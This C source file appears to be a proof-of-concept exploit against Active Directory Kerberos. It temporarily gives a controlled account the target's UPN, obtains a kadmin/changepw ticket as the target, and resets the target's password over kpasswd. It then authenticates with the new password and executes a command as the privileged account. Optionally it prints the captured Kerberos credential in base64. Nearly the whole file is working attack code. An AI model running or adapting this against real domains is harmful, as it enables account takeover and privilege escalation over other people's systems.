/***********************************************************************************************************************
*                                                                                                                       *
*   MODULO:        resetnightmare_rajkitpoc.c                                                                           *
*                                                                                                                       *
***********************************************************************************************************************/

#include "resetnightmare.h"

/***********************************************************************************************************************
*                                             OPCIONES Y ORQUESTACION                                                  *
***********************************************************************************************************************/

typedef enum _VERIFY_EXIT_CODE
{
	VERIFY_EXIT_ERROR				 = 1,
	VERIFY_EXIT_CONTROL_FAILED		 = 2,
	VERIFY_EXIT_KPASSWD_DENIED		 = 6,
	VERIFY_EXIT_KPASSWD_INCONCLUSIVE = 7,
	VERIFY_EXIT_KPASSWD_ACCEPTED	 = 8,
	VERIFY_EXIT_POSTCHECK_FAILED	 = 9
} VERIFY_EXIT_CODE;

typedef struct _PROGRAM_OPTIONS
{
	CHAR szTarget[RN_ACCOUNT_CCH];
	CHAR szControlled[RN_ACCOUNT_CCH];
	CHAR szDc[RN_ACCOUNT_CCH];
	CHAR szEtype[16];
	CHAR szControlledPassword[RN_PASSWORD_CCH];
	CHAR szNewTargetPassword[RN_PASSWORD_CCH];
	BOOL bPrintTicket;
} PROGRAM_OPTIONS, *PPROGRAM_OPTIONS;

static VOID printUsage( PCSTR pszProgram )
{
	printf( "Uso: %s --t <objetivo> --u <controlado> "
			"--controlled-password <password-controlado> "
			"--new-target-password <password-nuevo> [--d <dc>] "
			"[--e <AES256|AES128|RC4>] --execute [--print-Ticket]\n",
			pszProgram );
}

static BOOL parseOptions( INT iArgumentCount, PCHAR ppszArguments[], PROGRAM_OPTIONS *pOptions )
{
	BOOL bExecute = FALSE;

	if ( !pOptions )
		return FALSE;
	ZeroMemory( pOptions, sizeof( *pOptions ) );
	if ( !stringCopy( pOptions->szEtype, ARRAYSIZE( pOptions->szEtype ), RN_DEFAULT_ETYPE ) )
		return FALSE;

	for ( INT iArg = 1; iArg < iArgumentCount; iArg++ )
	{
		if ( _stricmp( ppszArguments[iArg], "--t" ) == 0 && iArg + 1 < iArgumentCount )
		{
			if ( !stringCopy( pOptions->szTarget, ARRAYSIZE( pOptions->szTarget ), ppszArguments[++iArg] ) )
				return FALSE;
		}
		else if ( _stricmp( ppszArguments[iArg], "--u" ) == 0 && iArg + 1 < iArgumentCount )
		{
			if ( !stringCopy( pOptions->szControlled, ARRAYSIZE( pOptions->szControlled ), ppszArguments[++iArg] ) )
				return FALSE;
		}
		else if ( _stricmp( ppszArguments[iArg], "--d" ) == 0 && iArg + 1 < iArgumentCount )
		{
			if ( !stringCopy( pOptions->szDc, ARRAYSIZE( pOptions->szDc ), ppszArguments[++iArg] ) )
				return FALSE;
		}
		else if ( _stricmp( ppszArguments[iArg], "--e" ) == 0 && iArg + 1 < iArgumentCount )
		{
			if ( !stringCopy( pOptions->szEtype, ARRAYSIZE( pOptions->szEtype ), ppszArguments[++iArg] ) )
				return FALSE;
		}
		else if ( _stricmp( ppszArguments[iArg], "--controlled-password" ) == 0 && iArg + 1 < iArgumentCount )
		{
			if ( !stringCopy( pOptions->szControlledPassword, ARRAYSIZE( pOptions->szControlledPassword ),
							  ppszArguments[++iArg] ) )
				return FALSE;
		}
		else if ( _stricmp( ppszArguments[iArg], "--new-target-password" ) == 0 && iArg + 1 < iArgumentCount )
		{
			if ( !stringCopy( pOptions->szNewTargetPassword, ARRAYSIZE( pOptions->szNewTargetPassword ),
							  ppszArguments[++iArg] ) )
				return FALSE;
		}
		else if ( _stricmp( ppszArguments[iArg], "--execute" ) == 0 )
		{
			bExecute = TRUE;
		}
		else if ( _stricmp( ppszArguments[iArg], "--print-Ticket" ) == 0 )
		{
			pOptions->bPrintTicket = TRUE;
		}
		else
		{
			return FALSE;
		}
	}
	return pOptions->szTarget[0] && pOptions->szControlled[0] && pOptions->szControlledPassword[0] &&
		   pOptions->szNewTargetPassword[0] && bExecute;
}

INT main( INT iArgumentCount, PCHAR ppszArguments[] )
{
	PROGRAM_OPTIONS			 stOptions						= { 0 };
	CHAR					 szBaseDn[RN_DN_CCH]			= { 0 };
	CHAR					 szRealm[RN_ACCOUNT_CCH]		= { 0 };
	CHAR					 szControlledDn[RN_DN_CCH]		= { 0 };
	CHAR					 szControlledUpn[RN_UPN_CCH]	= { 0 };
	CHAR					 szControlCname[RN_ACCOUNT_CCH] = { 0 };
	CHAR					 szControlRealm[RN_ACCOUNT_CCH] = { 0 };
	CHAR					 szKpasswdCname[RN_ACCOUNT_CCH] = { 0 };
	CHAR					 szKpasswdRealm[RN_ACCOUNT_CCH] = { 0 };
	CHAR					 szTargetCname[RN_ACCOUNT_CCH]	= { 0 };
	CHAR					 szTargetRealm[RN_ACCOUNT_CCH]	= { 0 };
	PCHAR					*ppszValues						= NULL;
	PBYTE					 pbExportedTicket				= NULL;
	KRB_CRED				 stControlCredential			= { 0 };
	KRB_CRED				 stTargetCredential				= { 0 };
	KRB_CRED				 stKpasswdCredential			= { 0 };
	LDAP					*pLdap							= NULL;
	LDAPMessage				*pMessage						= NULL;
	LDAPMessage				*pEntry							= NULL;
	PDOMAIN_CONTROLLER_INFOA pDcInfo						= NULL;
	ULONG					 ulVersion						= LDAP_VERSION3;
	ULONG					 ulResult;
	INT						 iEtype			  = KRB_ETYPE_AES256_CTS_HMAC_SHA1;
	INT						 iExitCode		  = VERIFY_EXIT_ERROR;
	USHORT					 usKpasswdResult  = 0;
	BOOL					 bRollbackFailed  = FALSE;
	BOOL					 bMutationStarted = FALSE;
	BOOL					 bTicketIssued	  = FALSE;
	UPN_ROTATION_STATE		 enRotationState  = UPN_ROTATION_ORIGINAL;

	setvbuf( stdout, NULL, _IONBF, 0 );
	setvbuf( stderr, NULL, _IONBF, 0 );
	printf( "[*] Inicio.\n" );

	if ( !parseOptions( iArgumentCount, ppszArguments, &stOptions ) || !parseEtype( stOptions.szEtype, &iEtype ) )
	{
		printUsage( ppszArguments[0] );
		goto Cleanup;
	}
	if ( _stricmp( stOptions.szTarget, stOptions.szControlled ) == 0 )
		goto Cleanup;

	if ( !stOptions.szDc[0] )
	{
		PCSTR pszDiscoveredDc;

		ulResult = DsGetDcNameA( NULL, NULL, NULL, NULL, DS_DIRECTORY_SERVICE_REQUIRED, &pDcInfo );
		if ( ulResult != ERROR_SUCCESS || !pDcInfo )
		{
			printf( "[-] No se pudo descubrir un controlador de dominio.\n" );
			goto Cleanup;
		}
		pszDiscoveredDc = pDcInfo->DomainControllerName;
		while ( *pszDiscoveredDc == '\\' )
			pszDiscoveredDc++;
		if ( !stringCopy( stOptions.szDc, ARRAYSIZE( stOptions.szDc ), pszDiscoveredDc ) )
		{
			printf( "[-] El nombre del controlador de dominio es demasiado largo.\n" );
			goto Cleanup;
		}
		NetApiBufferFree( pDcInfo );
		pDcInfo = NULL;
	}

	pLdap = ldap_initA( stOptions.szDc, LDAP_PORT );
	if ( !pLdap || ldap_set_option( pLdap, LDAP_OPT_PROTOCOL_VERSION, &ulVersion ) != LDAP_SUCCESS ||
		 ldap_bind_s( pLdap, NULL, NULL, LDAP_AUTH_NEGOTIATE ) != LDAP_SUCCESS )
	{
		printf( "[-] No se pudo establecer una sesion LDAP autenticada con %s.\n", stOptions.szDc );
		goto Cleanup;
	}

	{
		PCHAR ppszRootAttrs[] = { ( PCHAR )RN_DEFAULT_NAMING_CONTEXT, NULL };
		ulResult			  = ldap_search_ext_sA( pLdap, ( PCHAR ) "", LDAP_SCOPE_BASE, ( PCHAR ) "(objectClass=*)",
													ppszRootAttrs, 0, NULL, NULL, NULL, 1, &pMessage );
	}
	if ( ulResult != LDAP_SUCCESS || !( pEntry = ldap_first_entry( pLdap, pMessage ) ) )
		goto Cleanup;
	ppszValues = ldap_get_valuesA( pLdap, pEntry, ( PCHAR )RN_DEFAULT_NAMING_CONTEXT );
	if ( !ppszValues || !ppszValues[0] )
		goto Cleanup;
	if ( !stringCopy( szBaseDn, ARRAYSIZE( szBaseDn ), ppszValues[0] ) ||
		 !baseDnToRealm( szBaseDn, szRealm, ARRAYSIZE( szRealm ) ) )
		goto Cleanup;
	ldap_value_freeA( ppszValues );
	ppszValues = NULL;
	ldap_msgfree( pMessage );
	pMessage = NULL;
	if ( !findUniqueUserBySamAccountName( pLdap, szBaseDn, stOptions.szTarget, NULL, 0, NULL, 0 ) ||
		 !findUniqueUserBySamAccountName( pLdap, szBaseDn, stOptions.szControlled, szControlledDn,
										  ARRAYSIZE( szControlledDn ), szControlledUpn,
										  ARRAYSIZE( szControlledUpn ) ) )
	{
		printf( "[-] No se pudieron resolver ambas cuentas de forma unica.\n" );
		goto Cleanup;
	}
	if ( !upnHasExpectedOwner( pLdap, szBaseDn, stOptions.szTarget, NULL ) )
	{
		if ( upnHasExpectedOwner( pLdap, szBaseDn, stOptions.szTarget, szControlledDn ) )
			printf( "[-] El alias temporal %s sigue asignado a %s.\n", stOptions.szTarget, stOptions.szControlled );
		else
			printf( "[-] El alias temporal %s no esta libre o no pudo comprobarse.\n", stOptions.szTarget );
		goto Cleanup;
	}
	printf( "[*] Validando credencial %s de la cuenta controlada.\n", stOptions.szEtype );
	if ( !askTgtWithPasswordForPrincipal( stOptions.szControlled, stOptions.szControlled, szRealm,
										 stOptions.szControlledPassword, stOptions.szDc, iEtype, FALSE,
										 &stControlCredential ) )
	{
		printf( "[-] Control negativo/inconcluso: no se obtuvo el TGT normal.\n" );
		iExitCode = VERIFY_EXIT_CONTROL_FAILED;
		goto Cleanup;
	}
	if ( !getKrbCredIdentity( &stControlCredential, szControlCname, ARRAYSIZE( szControlCname ), szControlRealm,
							  ARRAYSIZE( szControlRealm ) ) ||
		 !krbCredHasService( &stControlCredential, szRealm, RN_TICKET_GRANTING_SERVICE, szRealm ) )
	{
		printf( "[-] Control negativo/inconcluso: TGT normal no valido.\n" );
		iExitCode = VERIFY_EXIT_CONTROL_FAILED;
		goto Cleanup;
	}
	if ( _stricmp( szControlCname, stOptions.szControlled ) != 0 || _stricmp( szControlRealm, szRealm ) != 0 )
	{
		printf( "[-] Control negativo/inconcluso: identidad recibida %s@%s.\n", szControlCname, szControlRealm );
		iExitCode = VERIFY_EXIT_CONTROL_FAILED;
		goto Cleanup;
	}
	printf( "[+] TGT normal validado.\n" );
	releaseKrbCred( &stControlCredential );

	if ( !modifyUserPrincipalName( pLdap, szControlledDn, stOptions.szTarget ) )
		goto Cleanup;
	enRotationState	 = UPN_ROTATION_CONTROLLED_OWNS_ALIAS;
	bMutationStarted = TRUE;
	if ( !upnHasExpectedOwner( pLdap, szBaseDn, stOptions.szTarget, szControlledDn ) )
		goto Cleanup;
	printf( "[+] Alias temporal: %s -> %s.\n", stOptions.szTarget, stOptions.szControlled );
	Sleep( KRB_DIRECTORY_SETTLE_MS );

	bTicketIssued = askAsTicketWithPasswordForPrincipal(
		stOptions.szTarget, stOptions.szControlled, szRealm, stOptions.szControlledPassword, stOptions.szDc,
		KRB_ETYPE_RC4_HMAC, iEtype, TRUE, RN_KADMIN_SERVICE, RN_CHANGE_PASSWORD_INSTANCE, &stKpasswdCredential );
	if ( !modifyUserPrincipalName( pLdap, szControlledDn, NULL ) )
	{
		bRollbackFailed = TRUE;
		goto Cleanup;
	}
	enRotationState = UPN_ROTATION_CONTROLLED_CLEARED;
	if ( !upnHasExpectedOwner( pLdap, szBaseDn, stOptions.szTarget, NULL ) )
	{
		printf( "[-] El alias temporal sigue presente; se cancela 464.\n" );
		goto Cleanup;
	}
	Sleep( KRB_DIRECTORY_SETTLE_MS );
	if ( !bTicketIssued )
	{
		printf( "[-] El KDC no emitio el ticket kadmin/changepw durante la propiedad temporal.\n" );
		iExitCode = VERIFY_EXIT_KPASSWD_INCONCLUSIVE;
		goto Cleanup;
	}
	if ( !getKrbCredIdentity( &stKpasswdCredential, szKpasswdCname, ARRAYSIZE( szKpasswdCname ), szKpasswdRealm,
							  ARRAYSIZE( szKpasswdRealm ) ) ||
		 !krbCredHasService( &stKpasswdCredential, szRealm, RN_KADMIN_SERVICE, RN_CHANGE_PASSWORD_INSTANCE ) ||
		 _stricmp( szKpasswdCname, stOptions.szTarget ) != 0 || _stricmp( szKpasswdRealm, szRealm ) != 0 )
	{
		printf( "[-] Ticket temporal invalido; se cancela 464.\n" );
		iExitCode = VERIFY_EXIT_KPASSWD_INCONCLUSIVE;
		goto Cleanup;
	}
	printf( "[+] Ticket temporal: %s@%s.\n", szKpasswdCname, szKpasswdRealm );
	if ( stOptions.bPrintTicket )
	{
		if ( encodeKrbCred( &stKpasswdCredential, &pbExportedTicket ) )
		{
			iExitCode = VERIFY_EXIT_KPASSWD_INCONCLUSIVE;
			goto Cleanup;
		}
		printf( "[!] KRB-CRED sensible:\n-----BEGIN KRB-CRED BASE64-----\n%s\n"
				"-----END KRB-CRED BASE64-----\n",
				( PCSTR )pbExportedTicket );
		releaseBase64Ticket( &pbExportedTicket );
	}

	if ( !changePasswordRfc3244( &stKpasswdCredential, stOptions.szDc, stOptions.szNewTargetPassword,
								 &usKpasswdResult ) )
	{
		printf( "[-] Fallo el intercambio kpasswd.\n" );
		iExitCode = VERIFY_EXIT_KPASSWD_INCONCLUSIVE;
		goto Cleanup;
	}
	if ( !restoreControlledUpn( pLdap, szControlledDn, szControlledUpn, &enRotationState ) ||
		 !hasRestoredUpnState( pLdap, szBaseDn, stOptions.szTarget, szControlledUpn, szControlledDn ) )
	{
		bRollbackFailed = TRUE;
		goto Cleanup;
	}
	printf( "[*] Resultado kpasswd: 0x%04X.\n", usKpasswdResult );
	if ( usKpasswdResult == KRB_KPASSWD_ACCESS_DENIED )
	{
		iExitCode = VERIFY_EXIT_KPASSWD_DENIED;
		goto Cleanup;
	}
	if ( usKpasswdResult != KRB_KPASSWD_RESULT_SUCCESS )
	{
		if ( usKpasswdResult == KRB_KPASSWD_AUTH_ERROR )
			iExitCode = VERIFY_EXIT_KPASSWD_DENIED;
		else
			iExitCode = VERIFY_EXIT_KPASSWD_INCONCLUSIVE;
		goto Cleanup;
	}

	if ( !askTgtWithPasswordForPrincipal( stOptions.szTarget, stOptions.szTarget, szRealm,
										  stOptions.szNewTargetPassword, stOptions.szDc, iEtype, FALSE,
										  &stTargetCredential ) ||
		 !getKrbCredIdentity( &stTargetCredential, szTargetCname, ARRAYSIZE( szTargetCname ), szTargetRealm,
							  ARRAYSIZE( szTargetRealm ) ) ||
		 _stricmp( szTargetCname, stOptions.szTarget ) != 0 || _stricmp( szTargetRealm, szRealm ) != 0 )
	{
		printf( "[!] kpasswd indico exito, pero la nueva password no autentica al objetivo.\n" );
		iExitCode = VERIFY_EXIT_POSTCHECK_FAILED;
		goto Cleanup;
	}
	printf( "\n\n[+] Password de la cuenta objetivo correctamente modificada.\n" );
	printf( "[+] Ejecutando comando con la cuenta privilegiada.\n" );

	if ( !execAsPrivUser( stOptions.szTarget, szRealm, stOptions.szNewTargetPassword, COMANDO ) )
	{
		iExitCode = VERIFY_EXIT_POSTCHECK_FAILED;
		goto Cleanup;
	}
	/** */
	iExitCode = VERIFY_EXIT_KPASSWD_ACCEPTED;

Cleanup:
	if ( pLdap && enRotationState != UPN_ROTATION_ORIGINAL )
	{
		printf( "[!] Rollback LDAP: restaurando el UPN original del controlado.\n" );
		if ( !restoreControlledUpn( pLdap, szControlledDn, szControlledUpn, &enRotationState ) )
			bRollbackFailed = TRUE;
	}
	if ( bMutationStarted && pLdap && enRotationState == UPN_ROTATION_ORIGINAL )
	{
		bRollbackFailed = !hasRestoredUpnState( pLdap, szBaseDn, stOptions.szTarget, szControlledUpn, szControlledDn );
	}
	if ( bRollbackFailed || enRotationState != UPN_ROTATION_ORIGINAL )
	{
		printf( "[!] Restaure manualmente el UPN de %s antes de repetir.\n", stOptions.szControlled );
		iExitCode = VERIFY_EXIT_ERROR;
	}
	SecureZeroMemory( stOptions.szControlledPassword, sizeof( stOptions.szControlledPassword ) );
	SecureZeroMemory( stOptions.szNewTargetPassword, sizeof( stOptions.szNewTargetPassword ) );
	releaseBase64Ticket( &pbExportedTicket );
	releaseKrbCred( &stControlCredential );
	releaseKrbCred( &stTargetCredential );
	releaseKrbCred( &stKpasswdCredential );
	if ( ppszValues )
		ldap_value_freeA( ppszValues );
	if ( pMessage )
		ldap_msgfree( pMessage );
	if ( pLdap )
		ldap_unbind( pLdap );
	if ( pDcInfo )
		NetApiBufferFree( pDcInfo );
	return iExitCode;
}
